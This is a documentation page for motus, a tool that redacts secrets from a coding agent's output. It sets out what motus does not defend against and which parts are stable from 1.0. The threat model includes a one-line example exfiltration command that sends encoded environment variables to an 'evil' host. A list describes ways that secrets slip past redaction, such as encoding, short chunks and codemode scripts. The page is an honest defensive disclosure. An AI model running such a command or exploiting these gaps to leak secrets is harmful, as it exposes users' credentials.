---
title: Limits and stability
description: What motus does not defend against, what it cannot match, and which parts follow semver from 1.0.
---

## Threat model

motus defends against accidental leaks: a well-meaning agent prints a secret. It does not defend against a hostile or prompt-injected agent. `curl evil?k=$(printenv | base64)` runs before any output is redacted, and encoding defeats exact matching. Stopping that takes agents that never inherit secrets, [`varlock proxy`](https://varlock.dev), or a sandbox.

Child processes keep inheriting your environment. Stripping secrets from it would break tools that need them, such as [`forge`](https://book.getfoundry.sh/forge/) with an RPC URL.

## What matching misses

- Base64 and reversed values.
- Chunks shorter than 12 characters, such as the last line of a wrapped secret. Longer chunks are redacted.
- Pieces of a secret that contains whitespace, such as a mnemonic or passphrase. Chunks match only inside words of 12 or more characters. Shorter words are redacted only as part of the whole value, so `cut`, `head`, `fold`, a JSON word array or a numbered list of a 12-word mnemonic comes back unchanged.
- Lowercase word path segments, usernames, query values and `#` parts on their own, such as `ethereum-mainnet` or `/hooks/correct-horse-battery`. The full URL is still redacted, so don't rely on a lowercase slug as a secret.
- Values shorter than `minValueLength` (8 by default).
- Secrets no source loaded and no vendor prefix covers.
- The bug-report summary calls the provider directly and pi offers no hook for it, so it is not redacted. Compaction and branch summaries are covered by `session_before_compact` and `session_before_tree`.
- Custom messages another extension writes outside the agent loop reach the session file raw: `sendMessage` while idle, `sendMessage` during streaming with `triggerTurn: false`, and `custom_message` boundary drafts. pi runs no `message_end` hook for them. motus redacts them before compaction and branch summaries, and `before_provider_request` redacts them in normal turns, so they stay out of provider requests.
- Codemode scripts. motus redacts each nested tool result and the final result, but a script can rebuild a secret between the two from text redaction missed, such as a parsed escape or a URL secret wrapped inside its key. `store()` persists through `pi.appendEntry`, which no hook sees. `models.classify` and `models.generateImages` call the provider without `onPayload`, so the `before_provider_request` backstop never runs. The same value returned as script output is redacted. Codemode is active by default with any configured MCP server. motus cannot hook these exits until pi adds them. See [the upstream request](https://github.com/espadat-studio/motus/blob/master/meta/research/pi-codemode-sinks.md).
- [pi](https://github.com/earendil-works/pi) keeps bash output in `/tmp/pi-bash-*` and in streaming updates. Neither reaches the model unredacted.

There are no entropy or generic hex rules, on purpose. They redact tx hashes, addresses and storage slots in web3 repos.

## 1.0 stability

These follow semver. Changing one is a major release.

| Surface         | Covers                                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------------------ |
| Config schema   | Keys, defaults and source options on [Configuration](/configuration/) and [Sources](/sources/)         |
| Source contract | The `SecretSource` and `Secret` shapes: `load` throws on failure, `appliesTo` scopes a required source |
| Placeholder     | The `[REDACTED:NAME]` text                                                                             |

Block reasons, status text and derived forms can change in a minor release. So can any module under `src/` other than the source contract.

## After 1.0

Planned sources: `pass`, `bitwarden`, `sops`, `secret-tool` and `security`. Until they ship, block their commands with `blockCommands`. The design is in the [spec](https://github.com/espadat-studio/motus/blob/master/meta/spec.md).
